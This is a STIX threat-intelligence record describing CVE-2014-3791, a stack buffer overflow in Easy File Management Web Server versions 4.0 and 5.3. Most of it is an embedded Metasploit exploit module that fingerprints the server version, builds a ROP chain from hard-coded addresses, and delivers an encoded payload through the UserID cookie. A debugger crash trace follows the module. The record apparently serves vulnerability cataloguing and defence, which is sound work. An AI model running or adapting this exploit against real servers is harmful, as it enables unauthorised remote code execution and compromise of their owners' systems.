{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--89f13364-0d66-4308-9674-6100e5f47e15",
    "created": "2024-08-14T16:55:41.759634Z",
    "modified": "2024-08-14T16:55:41.759639Z",
    "name": "Easy File Management Web Server Stack Buffer Overflow",
    "description": " Easy File Management Web Server v4.0 and v5.3 contains a stack buffer overflow condition that is triggered as user-supplied input is not properly validated when handling the UserID cookie. This may allow a remote attacker to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/efs_fmws_userid_bof.rb",
            "external_id": "efs_fmws_userid_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3791"
        },
        {
            "source_name": "reference",
            "url": "http://www.cnnvd.org.cn/vulnerability/show/cv_id/2014050536"
        },
        {
            "source_name": "reference",
            "url": "http://www.web-file-management.com/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking # Reliable memory corruption\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Easy File Management Web Server Stack Buffer Overflow',\n      'Description'    => %q{\n        Easy File Management Web Server v4.0 and v5.3 contains a stack buffer\n        overflow condition that is triggered as user-supplied input is not\n        properly validated when handling the UserID cookie. This may allow a\n        remote attacker to execute arbitrary code.\n      },\n      'Author'         =>\n        [\n          'superkojiman',  # Vulnerability discovery\n          'Julien Ahrens', # Exploit\n          'TecR0c <roccogiovannicalvi[at]gmail.com>' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE',   '2014-3791'],\n          ['OSVDB', '107241'],\n          ['EDB',   '33610'],\n          ['BID',   '67542'],\n          ['URL',   'http://www.cnnvd.org.cn/vulnerability/show/cv_id/2014050536'],\n          ['URL',   'http://www.web-file-management.com/']\n        ],\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC'   => 'process'\n        },\n      'Payload'        =>\n        {\n          'BadChars'   => \"\\x00\\x0a\\x0d;\",\n          'Space'      => 3420 # Lets play it safe\n        },\n      'Targets'        =>\n        [\n          # Successfully tested efmws.exe (4.0.0.0) / (5.3.0.0) on:\n          # -- Microsoft Windows XP [Version 5.1.2600]\n          # -- Microsoft Windows    [Version 6.1.7600]\n          # -- Microsoft Windows    [Version 6.3.9600]\n          ['Automatic Targeting', { 'auto' => true }],\n          ['Efmws 5.3 Universal', { 'Esp' => 0xA445ABCF, 'Ret' => 0x10010101 }],\n          ['Efmws 4.0 Universal', { 'Esp' => 0xA4518472, 'Ret' => 0x10010101 }],\n          # 0x10010101 = pop ebx > pop ecx > retn\n          # 0xA445ABCF = 0x514CF5 push esp > retn 0c\n          # 0xA4518472 = 0x457452 jmp esp\n          # From ImageLoad.dll\n        ],\n      'DisclosureDate' => '2014-05-20',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The URI path of an existing resource', '/vfolder.ghp'])\n        ])\n  end\n\n  def get_version\n\n    #\n    # NOTE: Version 5.3 still reports \"4.0\" in the \"Server\" header\n    #\n\n    version = nil\n    res = send_request_raw({'uri' => '/whatsnew.txt'})\n\n    unless res\n      vprint_error 'Connection failed'\n      return nil\n    end\n\n    if res.body =~ /What's new in Easy File Management Web Server V(\\d\\.\\d)/\n      version = $1\n      vprint_status \"Found version: #{version}\"\n    elsif res.headers['server'] =~ /Easy File Management Web Server v(4\\.0)/\n      version = $1\n      vprint_status \"Based on Server header: #{version}\"\n    end\n\n    version\n  end\n\n  def check\n    code = Exploit::CheckCode::Safe\n    version = get_version\n    if version.nil?\n      code = Exploit::CheckCode::Unknown\n    elsif version == \"5.3\"\n      code = Exploit::CheckCode::Appears\n    elsif version == \"4.0\"\n      code = Exploit::CheckCode::Appears\n    end\n\n    code\n  end\n\n  def exploit\n\n    #\n    # Get target version to determine how to reach call/jmp esp\n    #\n\n    print_status(\"Fingerprinting version...\")\n    version = get_version\n\n    if target.name =~ /Automatic/\n      if version.nil?\n        fail_with(Failure::NoTarget, \"#{peer} - Unable to automatically detect a target\")\n      elsif version =~ /5\\.3/\n        my_target = targets[1]\n      elsif version =~ /4\\.0/\n        my_target = targets[2]\n      end\n      print_good(\"Version #{version} found\")\n    else\n      my_target = target\n      unless version && my_target.name.include?(version)\n        print_error(\"The selected target doesn't match the detected version, trying anyway...\")\n      end\n    end\n\n    #\n    # Fu to reach where payload lives\n    #\n\n    sploit =  rand_text(80)                # Junk\n    sploit << [0x1001D8C8].pack(\"V\")       # Push edx\n    sploit << rand_text(280)               # Junk\n    sploit << [my_target.ret].pack(\"V\")    # Pop ebx > pop ecx > retn\n    sploit << [my_target['Esp']].pack(\"V\") # Setup call/jmp esp\n    sploit << [0x10010125].pack(\"V\")       # Contains 00000000 to pass the jnz instruction\n    sploit << [0x10022AAC].pack(\"V\")       # Mov eax,ebx > pop esi > pop ebx > retn\n    sploit << rand_text(8)                 # Filler\n    sploit << [0x1001A187].pack(\"V\")       # Add eax,5bffc883 > retn\n    sploit << [0x1002466D].pack(\"V\")       # Push eax > retn\n    sploit << payload.encoded\n\n    print_status \"Trying target #{my_target.name}...\"\n\n    #\n    # NOTE: Successful HTTP request is required to trigger\n    #\n\n    send_request_cgi({\n      'uri'    => normalize_uri(target_uri.path),\n      'cookie' => \"SESSIONID=; UserID=#{sploit}; PassWD=;\",\n    }, 1)\n  end\nend\n\n=begin\n\n#\n# 0x44f57d This will write UserID up the stack. If the UserID is to large it\n# will overwrite a pointer which is used later on at 0x468702\n#\n\neax=000007d1 ebx=00000000 ecx=000001f4 edx=016198ac esi=01668084 edi=016198ac\neip=0044f57d esp=016197e8 ebp=ffffffff iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\nfmws+0x4f57d:\n0044f57d f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n0:004> dd @esi\n01668084  41414141 41414141 41414141 41414141\n01668094  41414141 41414141 41414141 41414141\n016680a4  41414141 41414141 41414141 41414141\n016680b4  41414141 41414141 41414141 41414141\n016680c4  41414141 41414141 41414141 41414141\n016680d4  41414141 41414141 41414141 41414141\n016680e4  41414141 41414141 41414141 41414141\n016680f4  41414141 41414141 41414141 41414141\n\n(c38.8cc): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=00000000 ecx=015198fc edx=41414141 esi=015198ec edi=015198fc\neip=00468702 esp=015197c0 ebp=ffffffff iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nfmws+0x68702:\n00468702 ff5228          call    dword ptr [edx+28h]  ds:0023:41414169=????????\n\n=end\n",
    "x_mitre_disclosure_date": "2014-05-20",
    "x_mitre_platforms": [
        "win'"
    ]
}